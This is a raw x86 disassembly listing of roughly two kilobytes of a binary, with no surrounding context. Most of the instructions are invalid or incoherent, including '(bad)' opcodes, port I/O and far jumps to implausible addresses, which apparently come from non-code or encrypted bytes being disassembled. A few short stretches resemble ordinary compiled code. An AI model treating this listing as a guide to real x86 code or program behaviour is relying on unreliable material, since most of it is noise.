  405182:	div    BYTE PTR [esi]
  405184:	and    ah,BYTE PTR [esi-0x44d88173]
  40518a:	jl     0x40512a
  40518c:	cmp    BYTE PTR [eax+0xa],0x26
  405190:	inc    edi
  405191:	aaa    
  405192:	add    eax,0x45cea071
  405197:	push   ss
  405198:	in     eax,0x41
  40519a:	test   eax,ebx
  40519c:	popa   
  40519d:	jmp    0x17d8:0x336a22d5
  4051a4:	stc    
  4051a5:	lock test BYTE PTR [eax+0x4],0x4a
  4051aa:	(bad)  
  4051ab:	push   ss
  4051ac:	repz cdq 
  4051ae:	push   esi
  4051af:	inc    edx
  4051b0:	out    0x79,eax
  4051b2:	lock loope 0x405159
  4051b5:	sar    DWORD PTR [esp+eax*1+0x7844ffd2],cl
  4051bc:	(bad)  
  4051bd:	add    ebx,DWORD PTR [ecx-0x79722fec]
  4051c3:	jle    0x4051ad
  4051c5:	loope  0x405170
  4051c7:	inc    esi
  4051c8:	inc    edi
  4051c9:	cmpxchg BYTE PTR [eax-0x3b8d6040],al
  4051d0:	mov    al,0xe8
  4051d2:	fistp  DWORD PTR [edx]
  4051d4:	aaa    
  4051d5:	jp     0x4051e2
  4051d7:	into   
  4051d8:	adc    ch,cl
  4051da:	test   BYTE PTR ds:0x8d5c3053,dl
  4051e0:	(bad)  
  4051e1:	ds mov cl,0xf3
  4051e4:	ds scas eax,DWORD PTR es:[edi]
  4051e6:	sbb    BYTE PTR [ebp+0x3990b8c],0xc5
  4051ed:	neg    esp
  4051ef:	nop
  4051f0:	shl    DWORD PTR [ecx+0x1b],cl
  4051f3:	pusha  
  4051f4:	or     eax,esp
  4051f6:	es jl  0x405258
  4051f9:	repz sbb BYTE PTR [ecx+0x556ce910],al
  405200:	mov    al,0xa5
  405202:	retf   0xacbf
  405205:	pop    ebp
  405206:	jne    0x40523c
  405208:	out    0x59,al
  40520a:	dec    ebp
  40520b:	imul   ebp,DWORD PTR [ecx],0x6ab1d452
  405211:	jg     0x405231
  405213:	std    
  405214:	and    al,0x1c
  405216:	mov    eax,0x810e0deb
  40521b:	add    edi,DWORD PTR [esi+0x615b970b]
  405221:	lahf   
  405222:	iret   
  405223:	sub    BYTE PTR [eax],dl
  405225:	mov    DWORD PTR [ebp+0x10],eax
  405228:	jmp    0x405300
  40522d:	jo     0x405273
  40522f:	inc    esi
  405230:	dec    eax
  405231:	jbe    0x40527d
  405233:	jle    0x4052b1
  405235:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405237:	nop
  405238:	xor    ebp,DWORD PTR [ebx]
  40523a:	popa   
  40523b:	(bad)  
  40523c:	lahf   
  40523d:	inc    ecx
  40523e:	and    eax,0xbb0000
  405243:	add    BYTE PTR [eax],al
  405245:	cld    
  405246:	mov    ecx,DWORD PTR [ecx-0x3adb4017]
  40524c:	jmp    0x405212
  40524e:	syscall 
  405250:	dec    esp
  405251:	cwde   
  405252:	adc    ah,BYTE PTR [edx+eax*1]
  405255:	cmp    edx,esp
  405257:	add    edx,DWORD PTR [eax+0x11]
  40525a:	mov    esi,0x3a7cf246
  40525f:	cli    
  405260:	mov    bh,0x33
  405262:	(bad)  
  405263:	sbb    cl,BYTE PTR [ebx+0x23f4d075]
  405269:	or     edx,ecx
  40526b:	cs in  al,0x38
  40526e:	ja     0x4052a5
  405270:	xor    eax,0x4612bfa3
  405275:	(bad)  
  405276:	mov    eax,?
  405278:	ds dec edi
  40527a:	xchg   BYTE PTR [esi],ch
  40527c:	push   esp
  40527d:	jl     0x40522f
  40527f:	fisttp WORD PTR [ecx-0x4f]
  405282:	adc    esp,ecx
  405284:	aas    
  405285:	and    eax,0x7fe04298
  40528a:	add    cl,0x83
  40528d:	push   ebp
  40528e:	xchg   ebx,eax
  40528f:	sbb    eax,0x89e15c51
  405294:	pop    ss
  405295:	push   edx
  405296:	arpl   WORD PTR [esi-0x7d5a8897],dx
  40529c:	imul   ebx,DWORD PTR [eax-0x71dff60d],0x2c
  4052a3:	loope  0x4052e1
  4052a5:	mov    BYTE PTR [ebx+0x70],0x46
  4052a9:	lds    ebp,FWORD PTR [esi+0x2cd44412]
  4052af:	pop    es
  4052b0:	aad    0x87
  4052b2:	pop    ebx
  4052b3:	mov    ch,0x33
  4052b5:	push   edx
  4052b6:	ss int3 
  4052b8:	test   al,0xd
  4052ba:	in     eax,dx
  4052bb:	mov    ds:0x3ff6c4e8,eax
  4052c0:	jg     0x4052c5
  4052c2:	add    DWORD PTR [ebx],edx
  4052c4:	(bad)  
  4052c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052c6:	popw   ds
  4052c8:	sub    BYTE PTR [ebx-0x7798cf6c],al
  4052ce:	es jnp 0x40532f
  4052d1:	ss fwait
  4052d3:	test   al,0x85
  4052d5:	jmp    DWORD PTR [ebx+esi*4]
  4052d8:	out    0x65,eax
  4052da:	ins    DWORD PTR es:[edi],dx
  4052db:	dec    ebp
  4052dc:	xor    esi,DWORD PTR [ebp-0x46]
  4052df:	dec    esp
  4052e0:	sub    eax,DWORD PTR [edi-0x3866b67b]
  4052e6:	jecxz  0x405268
  4052e8:	push   0x5
  4052ea:	mov    dh,0x72
  4052ec:	shl    edi,cl
  4052ee:	bound  ecx,QWORD PTR [ebx+0x75]
  4052f1:	fidiv  WORD PTR [esi]
  4052f3:	(bad)  
  4052f4:	push   eax
  4052f5:	loop   0x405329
  4052f7:	cmp    DWORD PTR [ecx],0xffffffbe
  4052fa:	xor    BYTE PTR [ebx],al
  4052fc:	into   
  4052fd:	out    0x94,al
  4052ff:	mov    dh,0x8b
  405301:	add    DWORD PTR [edx-0x75],eax
  405304:	push   ecx
  405305:	add    al,0xf
  405307:	mov    bh,0x15
  405309:	cwde   
  40530a:	cmc    
  40530b:	inc    edx
  40530c:	add    BYTE PTR [ecx],ah
  40530e:	adc    eax,0x42f5bc
  405313:	jmp    0x4053eb
  405318:	pop    eax
  405319:	ds (bad) 
  40531c:	(bad)  
  40531d:	sti    
  40531e:	jg     0x4052de
  405320:	cmp    DWORD PTR [edi-0x4966e330],ebp
  405326:	push   0x6e
  405328:	cld    
  405329:	and    eax,0xbb0000
  40532e:	add    BYTE PTR [eax],al
  405330:	jbe    0x40532c
  405332:	int    0x3c
  405334:	mov    BYTE PTR [ebx],ch
  405336:	data16 mov WORD PTR [edx],gs
  405339:	xchg   BYTE PTR [esp+ebx*4],dl
  40533c:	inc    edi
  40533d:	adc    eax,0x4286377
  405342:	cmc    
  405343:	jp     0x40535e
  405345:	clc    
  405346:	out    0x43,eax
  405348:	mov    edx,0x15ed3e68
  40534d:	dec    ebp
  40534e:	mov    ds:0x3a944306,al
  405353:	pop    es
  405354:	scas   eax,DWORD PTR es:[edi]
  405355:	push   es
  405356:	pop    ebp
  405358:	jb     0x4052fb
  40535a:	xor    DWORD PTR [esi+0x47],eax
  40535d:	inc    esp
  40535e:	ror    esi,1
  405360:	fs cld 
  405362:	jnp    0x4053ba
  405364:	sub    ebp,DWORD PTR [eax+esi*1]
  405367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405368:	cmc    
  405369:	and    BYTE PTR [eax+0x33],bl
  40536c:	xchg   DWORD PTR [edi],edx
  40536e:	sub    esp,DWORD PTR [edi-0x18d7e876]
  405374:	push   ebp
  405375:	add    eax,0xcdce05cb
  40537a:	ss xchg esp,eax
  40537c:	ds in  eax,0x6
  40537f:	mov    bh,0x99
  405381:	cmp    al,0xb2
  405383:	xchg   ebx,eax
  405384:	push   esi
  405385:	les    edi,FWORD PTR [edx+0x68962660]
  40538b:	gs jae 0x4053ed
  40538e:	(bad)  
  40538f:	fnop   
  405391:	mov    ds:0x87edb2a5,eax
  405396:	je     0x405349
  405398:	test   DWORD PTR [eax],esi
  40539a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40539b:	dec    ecx
  40539c:	add    eax,0x6004d229
  4053a1:	and    DWORD PTR [ebx+esi*4-0x55],eax
  4053a5:	mov    esp,0x85654c6d
  4053aa:	test   al,0x1b
  4053ac:	out    0xb8,eax
  4053ae:	jle    0x4053f2
  4053b0:	and    ax,0x35d6
  4053b4:	pop    esp
  4053b5:	ret    0x7783
  4053b8:	cmc    
  4053b9:	add    BYTE PTR [ecx+0x28],0x64
  4053bd:	imul   eax,DWORD PTR es:[esi+0x24],0xf6b6213c
  4053c5:	adc    BYTE PTR [edx],ah
  4053c7:	jno    0x405429
  4053c9:	ss shr ecx,0xc6
  4053cd:	adc    eax,0x8ab34bd5
  4053d2:	lds    ecx,FWORD PTR [edi-0x1137bf9]
  4053d8:	inc    ebp
  4053d9:	out    0xd5,eax
  4053db:	ret    
  4053dc:	dec    ecx
  4053dd:	nop
  4053de:	cmp    eax,0xf19f1ad9
  4053e3:	mov    dh,BYTE PTR [edi+ecx*1+0x47]
  4053e7:	fadd   st(5),st
  4053e9:	mov    ebp,0xf7c63304
  4053ee:	shr    BYTE PTR ds:0x66479db3,cl
  4053f4:	mov    edx,DWORD PTR ds:0x42f544
  4053fa:	sub    DWORD PTR ds:0x42f584,edx
  405400:	imul   eax,DWORD PTR [ebp+0x10]
  405404:	sub    DWORD PTR ds:0x42f5e8,edi
  40540a:	mov    edx,eax
  40540c:	movzx  eax,BYTE PTR ds:0x42f5f8
  405413:	or     DWORD PTR ds:0x42f60c,eax
  405419:	mov    eax,DWORD PTR [ebp-0x24]
  40541c:	or     DWORD PTR ds:0x42f574,0x42f5f8
  405426:	jmp    0x4054fe
  40542b:	icebp  
  40542c:	out    0xf9,al
  40542e:	in     al,0xff
  405430:	(bad)  
  405431:	std    
  405432:	test   esp,0x9ec735c7
  405438:	sbb    esp,DWORD PTR [edx]
  40543a:	xchg   ebp,eax
  40543b:	mov    bh,0x26
  40543d:	add    BYTE PTR [eax],al
  40543f:	mov    ebx,0x60000000
  405444:	adc    BYTE PTR [esi-0x5e],bl
  405447:	imul   esi,edx,0x6ae2e317
  40544d:	sar    BYTE PTR [eax],0x82
  405450:	and    ah,ch
  405452:	cmc    
  405453:	stos   DWORD PTR es:[edi],eax
  405454:	test   BYTE PTR [edx],cl
  405456:	inc    edx
  405457:	call   0x3afb:0x8cd86198
  40545e:	call   0xb0148bed
  405463:	xor    BYTE PTR [edx-0x76],cl
  405466:	fnsave [ebx-0x60]
  405469:	outs   dx,BYTE PTR ds:[esi]
  40546a:	xchg   BYTE PTR [ebx+0x3b],dh
  40546d:	mov    ebx,0xd81c34f9
  405472:	push   ds
  405473:	mov    esi,0x2b5eff4
  405478:	gs push 0x46dc033a
  40547e:	sub    BYTE PTR [ebp+edx*4+0x59e59321],cl
  405485:	test   esp,edi
  405487:	add    eax,0x2e2f16d0
  40548c:	dec    ebp
  40548d:	jg     0x4054f4
  40548f:	dec    ebp
  405490:	pop    edx
  405491:	test   BYTE PTR [edx-0x33],bh
  405494:	mov    bh,0xd1
  405496:	test   DWORD PTR [edi+0x5dfd03e3],ebp
  40549c:	repz mov eax,0x73ebbe6c
  4054a2:	rol    BYTE PTR [eax],0xf5
  4054a5:	mov    esp,0xfd4b2b3c
  4054aa:	jge    0x4054b6
  4054ac:	cs nop
  4054ae:	pop    edi
  4054af:	xchg   edi,eax
  4054b0:	mov    al,0x94
  4054b2:	sahf   
  4054b3:	test   eax,0x611ec47b
  4054b8:	mov    ebp,0xb8841b1c
  4054bd:	bound  ecx,QWORD PTR [ebx-0x5c38bf03]
  4054c3:	mov    eax,0x90e0f48e
  4054c8:	mov    ebx,0x73f19f8e
  4054cd:	mov    bl,0x90
  4054cf:	add    DWORD PTR fs:[eax],esi
  4054d2:	mov    ah,0xff
  4054d4:	jno    0x4054ef
  4054d6:	sub    ecx,eax
  4054d8:	jmp    0xcdbc393d
  4054dd:	aaa    
  4054de:	adc    al,0x5d
  4054e0:	mov    DWORD PTR [ecx-0x17],esi
  4054e3:	(bad)  
  4054e4:	jmp    0x73014c6
  4054e9:	dec    eax
  4054ea:	mov    ebp,0x84bf455a
  4054ef:	punpcklwd mm1,DWORD PTR [esi+0x38]
  4054f3:	jno    0x40553e
  4054f5:	add    ecx,eax
  4054f7:	sub    al,0xaf
  4054f9:	dec    ebx
  4054fa:	ds push ebx
  4054fc:	outs   dx,BYTE PTR ds:[esi]
  4054fd:	mov    al,ds:0x5c71029
  405502:	or     al,0xf6
  405504:	inc    edx
  405505:	add    BYTE PTR [edx],bl
  405507:	inc    esi
  405508:	add    BYTE PTR [eax],al
  40550a:	jmp    0x4058f9
  40550f:	mov    edx,DWORD PTR ds:0x42f6e4
  405515:	mov    edx,DWORD PTR [edx]
  405517:	and    DWORD PTR ds:0x42f62c,edx
  40551d:	mov    DWORD PTR [ebp-0x24],eax
  405520:	mov    eax,DWORD PTR [ebp+0x20]
  405523:	cmp    DWORD PTR ds:0x42f5bc,0x0
  40552a:	ja     0x405558
  405530:	sbb    DWORD PTR ds:0x42f604,0x36a7
  40553a:	dec    edx
  40553b:	jmp    0x405558
  405540:	push   DWORD PTR [ebp-0x10]
  405543:	push   0x402c
  405548:	push   0x2bd9
  40554d:	push   0x8efe
  405552:	call   DWORD PTR ds:0x4387b8
  405558:	mov    edx,DWORD PTR [ebp+0x24]
  40555b:	xor    eax,esi
  40555d:	mov    DWORD PTR [ebp+0x10],eax
  405560:	mov    eax,DWORD PTR [edi]
  405562:	mov    edx,DWORD PTR [edi+0x4]
  405565:	adc    DWORD PTR ds:0x42f600,0x10cb
  40556f:	jmp    0x405647
  405574:	jg     0x405552
  405576:	dec    eax
  405577:	jne    0x405564
  405579:	cmc    
  40557a:	jg     0x40555a
  40557c:	mov    ebx,0x111c8213
  405581:	fst    DWORD PTR [ecx]
  405583:	xchg   ebp,eax
  405584:	jb     0x4055ad
  405586:	add    BYTE PTR [eax],al
  405588:	mov    ebx,0x24000000
  40558d:	jmp    0x4055d5
  40558f:	scas   eax,DWORD PTR es:[edi]
  405590:	push   edi
  405591:	jae    0x40558c
  405593:	test   DWORD PTR [ebx-0x43],0xc41d01c1
  40559a:	cdq    
  40559b:	in     al,dx
  40559c:	adc    esi,DWORD PTR [ecx+eax*4+0x601b741f]
  4055a3:	lds    edx,FWORD PTR [edi-0x6c]
  4055a6:	pop    edx
  4055a7:	call   0x9fe2:0xbaa31b17
  4055ae:	cmp    BYTE PTR [edx*2+0x20752355],cl
  4055b5:	push   edi
  4055b6:	mov    esp,0xd76a0861
  4055bb:	cmp    al,0xb0
  4055bd:	mov    BYTE PTR ds:0x79530826,dl
  4055c3:	lods   ax,WORD PTR ds:[esi]
  4055c5:	nop
  4055c6:	aaa    
  4055c7:	cli    
  4055c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055c9:	mov    al,ds:0x196d29c9
  4055ce:	push   ebp
  4055cf:	add    ebx,ebx
  4055d1:	push   ebx
  4055d2:	sub    ah,ch
  4055d4:	inc    ebp
  4055d5:	inc    eax
  4055d6:	fsub   QWORD PTR [ecx-0x6d]
  4055d9:	mov    DWORD PTR [edi+ecx*1],ecx
  4055dc:	adc    dh,BYTE PTR [ecx]
  4055de:	(bad)  
  4055e0:	fistp  DWORD PTR [ebx+ebx*4-0x4eccf9b2]
  4055e7:	fdiv   QWORD PTR [ebp+0x61]
  4055ea:	rol    DWORD PTR [ebx],cl
  4055ec:	call   0x2016a9ca
  4055f1:	xor    bl,dh
  4055f3:	sti    
  4055f4:	jbe    0x40563e
  4055f6:	pop    esp
  4055f7:	lods   al,BYTE PTR ds:[esi]
  4055f8:	dec    edi
  4055f9:	adc    DWORD PTR [ebx+0x3bd5f206],esp
  4055ff:	cmp    esi,esp
  405601:	pop    ss
  405602:	test   al,0x95
  405604:	idiv   DWORD PTR [eax-0x6f]
  405607:	add    ah,BYTE PTR [edx-0x6a]
  40560a:	repnz mov bh,0x1e
  40560d:	sub    al,0xb2
  40560f:	(bad)  
  405610:	xchg   ecx,eax
  405611:	sub    eax,0x225a5974
  405616:	les    esp,FWORD PTR ds:0xe8a33fd
  40561c:	push   eax
  40561d:	jb     0x405683
  40561f:	enter  0xc966,0x8e
  405623:	push   ecx
  405624:	sahf   
  405625:	outs   dx,BYTE PTR ds:[esi]
  405626:	xchg   edx,eax
  405627:	imul   DWORD PTR [eax-0x6e1a3918]
  40562d:	pop    esp
  40562e:	dec    edi
  40562f:	inc    esp
  405630:	mov    eax,ds:0x4485773e
  405635:	mov    bh,0x5c
  405637:	stos   BYTE PTR es:[edi],al
  405638:	xor    esp,0x4bc7651c
  40563e:	pop    es
  40563f:	inc    esi
  405640:	xlat   BYTE PTR ds:[ebx]
  405641:	mov    esi,0xe7880332
  405646:	add    BYTE PTR [ebx-0x2c16efab],cl
  40564c:	add    BYTE PTR [eax],al
  40564e:	add    BYTE PTR [ecx+ecx*8+0x75],dh
  405652:	dec    esi
  405653:	std    
  405654:	(bad)  
  405655:	jg     0x405652
  405657:	push   0x5c
  405659:	inc    ecx
  40565a:	or     eax,0xe400ad42
  40565f:	sub    eax,0xbb000028
  405664:	add    BYTE PTR [eax],al
  405666:	add    BYTE PTR [ebp-0x69834da],dl
  40566c:	(bad)  
  40566d:	jmp    0x37b836cb
  405672:	jmp    0x7b35bb93
  405677:	inc    edi
  405678:	in     al,0x22
  40567a:	dec    esi
  40567b:	xor    DWORD PTR [edx+0x4189d5f7],ecx
  405681:	enter  0xab31,0x15
  405685:	push   esi
  405686:	adc    al,0xce
  405688:	js     0x40562c
  40568a:	sbb    dh,BYTE PTR [eax]
  40568c:	sbb    al,0xe3
  40568e:	test   bh,bh
  405690:	(bad)  
  405691:	aaa    
  405692:	imul   esp,DWORD PTR [ebp+0x66],0x4b02f607
  405699:	pop    esp
  40569a:	sbb    dh,BYTE PTR [ebx+0x54]
  40569d:	popf   
  40569e:	inc    ebp
  40569f:	jo     0x405706
  4056a1:	lods   al,BYTE PTR ds:[esi]
  4056a2:	in     al,dx
  4056a3:	ror    BYTE PTR [edx],cl
  4056a5:	and    ecx,0x33a9203b
  4056ab:	jo     0x40563e
  4056ad:	lds    ecx,FWORD PTR [edx+0x48ca8ed3]
  4056b3:	push   eax
  4056b4:	nop
  4056b5:	and    al,0x6f
  4056b7:	rol    DWORD PTR [edi-0x727059ed],1
  4056bd:	lods   eax,DWORD PTR ds:[esi]
  4056be:	dec    ebp
  4056bf:	popf   
  4056c0:	mov    bl,0x64
  4056c2:	xor    al,0xf5
  4056c4:	loopne 0x4056c5
  4056c6:	pop    edi
  4056c7:	push   esp
  4056c8:	push   ebx
  4056c9:	bound  ebx,QWORD PTR [ecx+0x33]
  4056cc:	sub    DWORD PTR [ebx+0x63],esp
  4056cf:	sub    DWORD PTR [ecx+0x446c9b3b],eax
  4056d5:	sahf   
  4056d6:	add    al,0x4f
  4056d8:	push   edi
  4056d9:	dec    ebx
  4056da:	les    edx,FWORD PTR [eax+0x1003fc3b]
  4056e0:	les    ebp,FWORD PTR ds:0x388cd5e
  4056e6:	mov    ebx,0x66809349
  4056eb:	dec    edx
  4056ec:	ror    BYTE PTR es:[eax-0x98bd81d],cl
  4056f3:	pop    ss
  4056f4:	sub    DWORD PTR [esi-0x17],eax
  4056f7:	das    
  4056f8:	jae    0x40572d
  4056fa:	and    DWORD PTR [esi-0x9],ecx
  4056fd:	or     al,0x95
  4056ff:	push   cs
  405700:	add    al,0xe0
  405702:	dec    ebp
  405703:	inc    edi
  405704:	dec    ecx
  405705:	and    al,0x9b
  405707:	int    0xd2
  405709:	leave  
  40570a:	lds    ebx,FWORD PTR [esi]
  40570c:	pop    edi
  40570d:	mov    ecx,0x915f012
  405712:	lahf   
  405713:	xlat   BYTE PTR ds:[ebx]
  405714:	inc    eax
  405715:	and    DWORD PTR [edi+0x79],0x5b89c3ed
  40571c:	push   ebp
  40571d:	ror    BYTE PTR ds:0x33071b44,cl
  405723:	mov    BYTE PTR [ecx+0x42f64835],0x0
  40572a:	inc    esp
  40572b:	add    BYTE PTR [bx+si],al
  40572e:	jmp    0x405806
  405733:	mov    al,0xfb
  405735:	mov    edx,0xfff5fbf5
  40573a:	call   ebp
  40573c:	retw   0x7acd
  405740:	mov    cs,WORD PTR [eax+0x67]
  405743:	call   0xbb405770
  405748:	add    BYTE PTR [eax],al
  40574a:	add    ch,ch
  40574c:	in     al,dx
  40574d:	dec    esi
  40574e:	mov    bh,ah
  405750:	outs   dx,DWORD PTR ds:[esi]
  405751:	sbb    BYTE PTR [eax-0x1ddf67d9],al
  405757:	cdq    
  405758:	or     ch,BYTE PTR ds:0xb7dced9b
  40575e:	dec    esp
  40575f:	or     bh,dh
  405761:	inc    eax
  405762:	popa   
  405763:	iret   
  405764:	push   esi
  405765:	pop    esi
  405766:	inc    ebp
  405767:	enter  0x304a,0x58
  40576b:	adc    BYTE PTR [ebp-0x4c72959f],al
  405771:	cmp    BYTE PTR [edx+0x35],0xe8
  405775:	out    dx,al
  405776:	jnp    0x4057d5
  405778:	inc    ecx
  405779:	stos   BYTE PTR es:[edi],al
  40577a:	lahf   
  40577b:	sub    DWORD PTR [edi],eax
  40577d:	scas   eax,DWORD PTR es:[edi]
  40577e:	ds (bad) 
  405781:	sub    DWORD PTR [esi],0xd09ff118
  405787:	or     al,0xdc
  405789:	in     eax,0x1e
  40578b:	inc    eax
  40578c:	fistp  WORD PTR [edx-0x48623763]
  405792:	inc    eax
  405793:	je     0x4057c6
  405795:	mov    ah,0x20
  405797:	stos   DWORD PTR es:[edi],eax
  405798:	outs   dx,DWORD PTR ds:[esi]
  405799:	xor    esp,edi
  40579b:	dec    edi
  40579c:	(bad)  
  40579d:	inc    ebp
  40579e:	pop    esi
  40579f:	add    ah,BYTE PTR [ebx+0x68]
  4057a2:	fwait
  4057a3:	pop    esp
  4057a4:	mov    edi,0xe2f7033e
  4057a9:	rcr    DWORD PTR [ebx],cl
  4057ab:	in     al,dx
  4057ac:	pushf  
  4057ad:	(bad)  
  4057ae:	ret    
  4057af:	fmul   st,st(2)
  4057b1:	jge    0x4057d8
  4057b3:	cwde   
  4057b4:	stc    
  4057b5:	sub    BYTE PTR [ebx-0x67c36b9],al
  4057bb:	sar    dl,0x5b
  4057be:	adc    DWORD PTR [eax-0x5bc116],ecx
  4057c4:	add    BYTE PTR [ebx],ah
  4057c6:	push   ecx
  4057c7:	std    
  4057c8:	xchg   edi,eax
  4057c9:	stc    
  4057ca:	je     0x4057cd
  4057cc:	stos   DWORD PTR es:[edi],eax
  4057cd:	enter  0x4821,0xe3
  4057d1:	sub    cl,0xc0
  4057d4:	out    dx,eax
  4057d5:	retf   
  4057d6:	hlt    
  4057d7:	pop    ss
  4057d8:	inc    ecx
  4057d9:	cmc    
  4057da:	push   ss
  4057db:	or     BYTE PTR ds:0xeaca365a,bl
  4057e1:	xor    BYTE PTR [edi-0x734eddde],0x4c
  4057e8:	cli    
  4057e9:	cmp    dh,BYTE PTR [edx-0x12]
  4057ec:	cmp    BYTE PTR ds:[edi+ebp*4],dl
  4057f0:	jg     0x40582f
  4057f2:	dec    ebx
  4057f3:	cwde   
  4057f4:	pop    edi
  4057f5:	(bad)  
  4057f6:	hlt    
  4057f7:	fsub   QWORD PTR [ebp+0x64bc0a07]
  4057fd:	mov    dl,0xe2
  4057ff:	jo     0x405842
  405801:	outs   dx,BYTE PTR ds:[esi]
  405802:	pusha  
  405803:	sbb    dl,ah
  405805:	mov    dh,0x8d
  405807:	xchg   esp,eax
  405808:	adc    BYTE PTR [edx+0x353370c4],bl
  40580e:	inc    edx
  40580f:	pop    edi
  405810:	add    BYTE PTR [eax],al
  405812:	jmp    0x4058ea
  405817:	mov    ebx,0xdf1293e7
  40581c:	jbe    0x4057d9
  40581e:	out    dx,eax
  40581f:	xchg   ebx,eax
  405820:	(bad)  
  405821:	aad    0xde
  405823:	sbb    DWORD PTR [esi+0x29a33f57],esi
  405829:	add    BYTE PTR [eax],al
  40582b:	mov    ebx,0x12000000
  405830:	sbb    esp,DWORD PTR [eax-0x7450acd0]
  405836:	inc    edi
  405837:	mov    bh,0xc0
  405839:	nop    ecx
  40583c:	mov    dl,BYTE PTR [edx-0x78ded10a]
  405842:	add    ecx,DWORD PTR [eax-0x43]
  405845:	cwde   
  405846:	and    eax,0xcd0c85e2
  40584b:	shr    BYTE PTR [eax+ebx*4],0xdc
  40584f:	dec    ebx
  405850:	lods   eax,DWORD PTR ds:[esi]
  405851:	sub    dl,dh
  405853:	test   ch,0xe5
  405856:	jmp    0xd9f5d00d
  40585b:	sbb    al,0xc1
  40585d:	xchg   edx,eax
  40585e:	hlt    
  40585f:	xor    al,0x22
  405861:	outs   dx,BYTE PTR ds:[esi]
  405862:	add    eax,0xa0f8ae1f
  405867:	sbb    eax,0xaa977da9
  40586c:	xor    DWORD PTR [esi+0x35f1ccff],esp
  405872:	dec    edx
  405873:	adc    ecx,DWORD PTR [edi]
  405875:	cs and al,0xac
  405878:	(bad)  
  405879:	stc    
  40587a:	sbb    edi,DWORD PTR [edi]
  40587c:	xchg   ebx,eax
  40587d:	fistp  DWORD PTR [ecx-0x65]
  405880:	mov    ecx,0xb57ffb3
  405885:	sub    ch,BYTE PTR [eax]
  405887:	(bad)  
  405888:	mov    eax,ds:0x50a2539c
  40588d:	daa    
  40588e:	sub    edx,DWORD PTR [edi]
  405890:	pop    eax
  405891:	cli    
  405892:	loop   0x4058cb
  405894:	jns    0x405911
  405896:	jecxz  0x405834
  405898:	hlt    
  405899:	cmp    esi,DWORD PTR [esi]
  40589b:	jmp    FWORD PTR [edx*1-0x6f4a21e3]
  4058a2:	daa    
  4058a3:	sahf   
  4058a4:	mov    ebp,0x328e490a
  4058a9:	test   eax,0xeed67d4a
  4058ae:	mov    bl,ch
  4058b0:	adc    esp,DWORD PTR [edi]
  4058b2:	xlat   BYTE PTR ds:[ebx]
  4058b3:	sub    DWORD PTR [edx+0x165dcb9a],eax
  4058b9:	icebp  
  4058ba:	shl    cl,0xd8
  4058bd:	scas   eax,DWORD PTR es:[edi]
  4058be:	sub    DWORD PTR [edx+ecx*1-0x61],0x8b5844f5
  4058c6:	popf   
  4058c7:	mov    BYTE PTR [edi+edi*2],al
  4058ca:	repnz cs fs loopne 0x405920
  4058cf:	retf   
  4058d0:	fwait
  4058d1:	(bad)  
  4058d2:	xchg   edi,eax
  4058d3:	(bad)  
  4058d4:	fs or  eax,0x8e380f5e
  4058da:	dec    esi
  4058db:	mov    eax,0x284a5c22
  4058e0:	aam    0xc7
  4058e2:	mov    dl,0xff
  4058e4:	pop    ds
  4058e5:	add    dl,BYTE PTR [edx]
  4058e7:	shl    bl,1
  4058e9:	arpl   WORD PTR [ebx+0x1581dc45],cx
  4058ef:	mov    ch,dh
  4058f1:	inc    edx
  4058f2:	add    BYTE PTR [esi+esi*8],ah
  4058f5:	inc    edx
  4058f6:	add    BYTE PTR [ecx],al
  4058f8:	adc    BYTE PTR [ecx],cl
  4058fa:	sbb    eax,0x42f638
  4058ff:	jmp    0x4059d7
  405904:	test   dh,bh
  405906:	cld    
  405907:	sub    bh,dh
  405909:	sub    dl,dh
  40590b:	(bad)  
  40590c:	xor    DWORD PTR [ebx+edi*8-0xa430022],ecx
  405913:	ficomp WORD PTR [esi+0x2a]
  405916:	add    BYTE PTR [eax],al
  405918:	mov    ebx,0xcb000000
  40591d:	xchg   ecx,eax
  40591e:	xchg   edx,eax
  40591f:	sti    
  405920:	leave  
  405921:	loopne 0x4058b7
  405923:	cmp    DWORD PTR [ebx],0xffffffb1
  405926:	adc    esp,DWORD PTR [ebp-0x4c2fdaee]
  40592c:	cmp    al,0xcf
  40592e:	push   ecx
  40592f:	jle    0x405931
  405931:	jle    0x40592c
  405933:	mov    cl,0xe6
  405935:	dec    edi
  405936:	ja     0x405907
  405938:	and    DWORD PTR [esi-0x70],esp
  40593b:	mov    WORD PTR [esi],cs
  40593d:	int    0x9a
  40593f:	adc    al,0x96
  405941:	mov    eax,0x2498764
  405946:	push   ebx
  405947:	into   
  405948:	nop
  405949:	repz in eax,0xe3
  40594c:	loope  0x405978
  40594e:	xchg   BYTE PTR [ebx],ah
  405950:	mov    dl,BYTE PTR [esi-0x37c68d2e]
  405956:	js     0x40599f
  405958:	mov    al,ds:0x5bf48ea7
  40595d:	add    BYTE PTR [esi-0x56],bh
  405960:	mov    eax,0x45e28b0b
  405965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405966:	fisubr WORD PTR [esi-0x16799a5a]
  40596c:	dec    esp
  40596d:	mov    al,ds:0x8a582b2a
  405972:	retf   0x6559
  405975:	das    
  405976:	xchg   esp,eax
  405977:	rcl    BYTE PTR [esp+eax*2-0x5ca9f74c],1
  40597e:	add    dl,ch
  405980:	mov    edi,0xfc8be9df
  405985:	and    BYTE PTR [ecx+0x7fad67f7],0x3d
  40598c:	cmp    eax,DWORD PTR ds:0xc68ec569
  405992:	xchg   BYTE PTR [edi+0x52],al
  405995:	mov    ecx,0x60bf2d2
  40599a:	cmp    DWORD PTR [esi-0x57],esp
  40599d:	loope  0x4059dc
  40599f:	jb     0x405a13
  4059a1:	dec    ebx
  4059a2:	mov    bh,0x55
  4059a4:	mov    ds,WORD PTR [ecx]
  4059a6:	stc    
  4059a7:	sbb    cl,BYTE PTR [eax-0x4e240566]
  4059ad:	adc    DWORD PTR [ebx],0xffffffff
  4059b0:	mov    ch,0x1e
  4059b2:	es aad 0x17
  4059b5:	pop    edx
  4059b6:	add    BYTE PTR [eax+0x53],cl
  4059b9:	nop
  4059ba:	rcr    BYTE PTR [esi+0x5bb2b2],cl
  4059c0:	sbb    esp,esp
  4059c2:	out    dx,eax
  4059c3:	cmp    dl,BYTE PTR [ebp+eax*8+0x27]
  4059c7:	cmp    dl,0x31
  4059ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059cb:	add    BYTE PTR [edx-0x4c],dh
